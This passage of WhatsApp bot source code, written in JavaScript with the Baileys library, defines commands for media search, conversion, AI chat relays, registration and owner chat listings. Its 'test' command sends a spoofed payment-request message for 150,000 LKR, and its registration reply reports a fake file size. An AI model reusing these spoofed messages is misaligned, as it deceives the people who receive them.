Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
limitAdd(m.sender, limit)
break
//========================
case 'igstalk':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Example: ${prefix+command} unknopin`)
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/tools/igstalk?username=${q}`)
const nick = anu.result.username
const nama = anu.result.fullname
const post = anu.result.post
const foll = anu.result.followers
const foli = anu.result.following
const bio = anu.result.bio
Al.sendMessage(m.chat, { image: { url: anu.result.profile}, caption: `Nickname : ${nick}\nFullname : ${nama}\nPostingan : ${post}\nFollowers : ${foll}\nFollowing : ${foli}\nBio : ${bio}`}, {quoted: m})
}catch (error) {
m.reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}
limitAdd(m.sender, limit)
break
//========================
case 'cr': case 'credit': case 'tqto': case 'thanksto': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let tqto = `
*🍪  THANKS TO  🍪*

• Tuhan
• Kedua Orang tua
• Sanjaya
• Wann
• Lorenzo
• Dan Pengembang Lainya

Ini Lebih Tepat Nya Orang Yang Ngasih
Tips Ke Gw Dan Bantuan Ke Gw

`
Al.sendMessage(m.chat, {image: {url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg'}, caption: tqto}, { quoted: floc})
}
break
//========================
case 'intro':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var intro =`0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
│ *Status     :* 
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
Al.sendMessage(m.chat, {text: intro }, {quoted: floc})
}
break
//========================
case 'infobot': 
case 'botinfo':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var capt = `*𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭* Information

*• Name :* ${namabot}
*• Owner :* ${namaowner}
*• Versi :* 1.1
*• Penerus :* ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙
*• Wa :* https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R
`
await Al.sendMessage(m.chat, {
text: capt,
contextInfo: {
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: { 
title: `${sopanDong}`,
body: `${pushname}`,
thumbnailUrl: global.mark,
sourceUrl: `https://www.youtube.com`,
mediaType: 1,
renderLargerThumbnail: false
}}}, { quoted: memek})
}
 break
case 'speed': case 'ping':{
const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
💻 Info Server
-▸Ram: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
-▸Response Speed ${latensi.toFixed(4)} _Second_ 
-▸${oldd - neww} _miliseconds_
-▸Runtime : ${runtime(process.uptime())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	await Al.sendMessage(m.chat, {
text: respon, 
contextInfo: {
externalAdReply: {  
title: ``,
body: '| ━➤ 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥',
thumbnailUrl: global.thumb,
sourceUrl: `https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: floc})
}
break
//========================
case 'tes': 
case 'test':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var teks = `${namabot} Aktif kak\nSilahkan ketikan *.menu all*`
 Al.relayMessage(m.chat,  {
     requestPaymentMessage: {
           currencyCodeIso4217: 'LKR',
                 amount1000: 150000000,
                       requestFrom: m.sender,
                             noteMessage: {
                                   extendedTextMessage: {
                                         text: teks,
                                               contextInfo: {
                                                     externalAdReply: {
                                                           showAdAttribution: true
                                                                 }}}}}}, {})
                                                                 }
                                                                 break
//========================
case 'song': {
                if (!text) return reply(`*Example :* ${prefix + command} Drunk Text`)
                 // Menghasilkan pengurangan acak antara 1 dan 5
    const randomReduction = Math.floor(Math.random() * 5) + 1;
    
                let search = await yts(text)
                let linknya = search.all[0].url
                let bodytextnya = `ᴛɪᴛʟᴇ : *${search.all[0].title}*\nᴠɪᴇᴡs : *${search.all[0].views}*\nᴅᴜʀᴀᴛɪᴏɴ : *${search.all[0].timestamp}*\nᴜᴘʟᴏᴀᴅᴇᴅ : *${search.all[0].ago}*\nᴜʀʟ : *${linknya}*`
               // hardi.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
                
            let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodytextnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : search.all[0].thumbnail }}, { upload: Al.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: "⛅ 𝙼𝚊𝚗𝚞" ,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Video 🎬","id":"${prefix}ytmp4 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Audio 🎵","id":"${prefix}ytmp3 ${linknya}"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                    newsletterJid: "120363232588171807@newsletter",
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Al.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
//========================
case 'pinterest': case 'pin': {
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: Al.waUploadToServer
    });
    return imageMessage;
  }
  
  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 10); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `${sopanDong} Kak\nImage ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: '𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭'
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": "{\"display_text\":\"𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳 💙\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hi\n_Follow Channel Manu-MD_<\https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n*By - : ✨...©𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥...💗*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await Al.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
break
//========================
case 'pinterest': case 'pin':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
Al.sendMessage(m.chat, { image: { url: result }, caption: 'Done kak'}, { quoted: m })
}
limitAdd(m.sender, limit)
break
//========================
case'yts':{
if (!text) return reply('ya ya ya')
let wm = `${ucapanWaktu} || *「 𝐌𝐚𝐧𝐮-𝐌𝐃  」* 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗`

  // Menghasilkan pengurangan acak antara 1 dan 5
  const randomReduction = Math.floor(Math.random() * 5) + 1;
    let search = await yts(text);
    let videos = search.all;

    if (!videos || videos.length === 0) {
      reply('No video found');
      return;
    }

    // Pilih antara 1 dan 5 video secara acak
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 5) + 1);
    const selectedVideos = [];

    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Menghindari pemilihan video yang sama
      selectedVideos.push(randomVideo);
    }

    let push = [];

    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;

      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: Al.waUploadToServer });

      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ke - ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Video 🎬","id":"${prefix}ytmp4 ${video.url}"}`
            },
            {
              "name": "quick_reply",
              "buttonParamsJson": `{"display_text":"Audio 🎵","id":"${prefix}ytmp3 ${video.url}"}`
            }
          ]
        })
      });
    }

    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: mess.success
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: wm
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            })
          })
        }
      }
    }, {});

    await Al.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });

}
break
//========================
case 'ytmp4': 
case 'youtubemp4': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Example : ${prefix + command} _Link nya_`)

const ytc = `*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~'`
let searchResponse = await ytdlnew(text)
Al.sendMessage(m.chat, { video: { url: searchResponse.mp4DownloadLink }, caption: ytc }, { quoted: floc})
}
//========================
case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
try {
let set;
if (/bass/.test(command))
set = "-af equalizer=f=54:width_type=o:width=2:g=20";
if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
if (/earrape/.test(command)) set = "-af volume=12";
if (/fast/.test(command))
set = '-filter:a "atempo=1.63,asetrate=44100"';
if (/fat/.test(command))
set = '-filter:a "atempo=1.6,asetrate=22100"';
if (/nightcore/.test(command))
set = "-filter:a atempo=1.06,asetrate=44100*1.25";
if (/reverse/.test(command)) set = '-filter_complex "areverse"';
if (/robot/.test(command))
set =
"-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
if (/slow/.test(command))
set = '-filter:a "atempo=0.7,asetrate=44100"';
if (/smooth/.test(command))
set =
"-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
if (/tupai/.test(command))
set = '-filter:a "atempo=0.5,asetrate=65100"';
if (/audio/.test(mime)) {
m.reply(mess.wait);
let media = await Al.downloadAndSaveMediaMessage(quoted);
let ran = getRandom(".mp3");
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media);
if (err) return m.reply(err);
let buff = fs.readFileSync(ran);
Al.sendMessage(
m.chat,
{ audio: buff, mimetype: "audio/mpeg" },
{ quoted: m }
);
fs.unlinkSync(ran);
});
} else
m.reply(
`Reply to audio to change with title *${
prefix + command
}*`
);
} catch (e) {
m.reply(e);
}
break;
//========================
case'toptv':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@adiwajshing/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) return m.reply(`Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`)
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
Al.relayMessage(m.chat, dataVideo, {})
}
limitAdd(m.sender, limit) 
break
case 'tovn': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
 if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Al.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case 'toaudio': case 'tomp3':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
 if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Al.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case'say':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Wann?`)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
m.reply(e + '')
res = await tts(text)
} finally {
Al.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {})
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case'togif': case'tomp4':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`Balas sticker video Dengan Caption ${prefix + command}`)
if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption _${prefix + command}_`)
 let { webp2mp4File } = require('./lib/uploader')
let media = await Al.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Al.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
limitAdd(m.sender, limit)
break
case 'toimage': case 'toimg': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply (`Balas sticker dengan caption *${prefix + command}*`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
let media = await Al.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
Al.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
limitAdd(m.sender, limit)
break
case 'furina': case 'simi':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) m.reply('Iya Kak?')
let simi = await fetchJson(`https://api.junn4.my.id/ai/simi?text=${q}`)
const simi2 = simi.result
Al.sendMessage(m.chat, {text: simi2}, { quoted: floc})
break
case "google":{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n─────────────┈──\n\n`;
}
m.reply(teks)
})
}
limitAdd(m.sender, limit)
break
case 'ai': case 'openai': {
                if (!q) return m.reply(`*Nanya Apa Sayang..?*`)
                m.reply('_Loading..._')
                  var jay = await fetchJson(`https://widipe.com/openai?text=${q}`)
                  var jaya = jay.result
                 await m.reply(jaya)
    }
    break
case 'chtgpt4o': case 'gpt4o': {
                if (!q) return m.reply(`*Nanya Apa Sayang..?*`)
                m.reply('_Loading..._')
                  var jay = await fetchJson(`https://itzpire.com/ai/gpt4o?q=${q}`)
                  var jaya = jay.result
                 await m.reply(jaya)
     }
     break
case 'ai-img': {
if (!text) return m.reply('Mana Promt Nya Bos...')
	try {
	  m.reply(mess.wait)
  let ini = await fetchJson(`https://itzpire.com/ai/search-img?q=${q}`);
for (let bing of ini.result) {
await sleep(500)
await Al.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
Al.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Al.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'gemini': {
                if (!q) return m.reply(`*Nanya Apa Sayang..?*`)
                m.reply('_Loading..._')
                  var jay = await fetchJson(`https://widipe.com/gemini?text=${q}`)
                  var jaya = jay.result
                 await m.reply(jaya)
        }
        break
//===========
case 'daftar':
case 'verify':
case 'register':
const isRegis = checkRegisteredUser(m.sender)
if (isRegis) return m.reply('කම්මැලි, ඔබ දැනටමත් ලියාපදිංචි වී ඇත්තේ ඔබ දැනටමත් ලියාපදිංචි වී ඇති බැවිනි')
if (!q.includes('.')) return m.reply('*ආකෘතිය වැරදි! උදාහරණයේ ආකාරයට භාවිතා කරන්න*\n\n*Example :* .register Manu.18')
const namaUser = q.substring(0, q.indexOf('.') - 0)
const umurUser = q.substring(q.lastIndexOf('.') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return m.reply('වයස අංකයක් විය යුතුය !!')
if (namaUser.length >= 30) return m.reply(`දිගු නම, උපරිම අක්ෂර 30`)
if (umurUser > 40) return m.reply(`ඔබ වයස වැඩියි, වැඩිම වයස 40`)
if (umurUser < 10) return m.reply(`ඔබගේ වයස වැඩියි, අවම වයස අවුරුදු 10 යි`)
let mzd = `*INFO USER*\n\n⎋ Name : ${namaUser}\n⎋ AGE : ${umurUser}\n\n⎋ Limit : ${isPremium ? 'Unlimited' : '30'}\n⎋ Register : ${tanggal}\n\n *හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~'`
let veri = m.sender
if (!m.isGroup) {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
Al.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 99999999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `SUCCESFULLY`, 
body: ``, 
description: 'Nothing',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: global.sgc,
}}
})
} else {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
Al.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 99999999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `SUCCESFULLY`, 
body: ``, 
description: 'Nothing',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: global.sgc,
}}
})
}
break
//========================
case 'creategc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
if (!args.join(" ")) return m.reply(`Enter nama grup`) 
let cret = await Al.groupCreate(args.join(" "), [])
let responsee = await Al.groupInviteCode(cret.id)
teks = `「 Group Create Fitur 」

༫ Subject Group : ${cret.subject}
༫ Owner Group : @${cret.owner.split("@")[0]}
༫ Creation Group : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

⌞ ʟɪɴᴋ ɢʀᴏᴜᴘ ⌝
https://chat.whatsapp.com/${responsee}
`
Al.sendMessage(m.chat, {text: teks,mentions: parseMention(teks)}, {quoted: m})
await sleep(500)
Al.sendMessage(`${groupMetadata.id}`, { text: 'Welcome to the new group members hehe' })
}
limitAdd(m.sender, limit)
break
case 'listgc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await Al.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
Al.sendTextWithMentions(m.chat, teks, m)
}
limitAdd(m.sender, limit)
break
case 'listpc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n─────────────┈──\n\n`
                 }
                 Al.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'delsampah':{
if (!isCreator) return m.reply(mess.OnlyOwner)
let directoryPath = path.join('./tmp') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
m.reply(teks)
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./tmp/${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah")
});
}
break
case 'sampah2':
if (!isCreator) return m.reply('Khusus Owner')
let fl = await fs.readdirSync('./')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("mp3")).map(v=>v).length} Sampah\n\n`
teks += fl.filter(v => v.endsWith("mp3")).map(o=>`${o}\n`).join("");
m.reply(teks)
break
case 'delsampah2':{
if (!isCreator) return m.reply('Khusus Owner')
let directoryPath = path.join('./') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
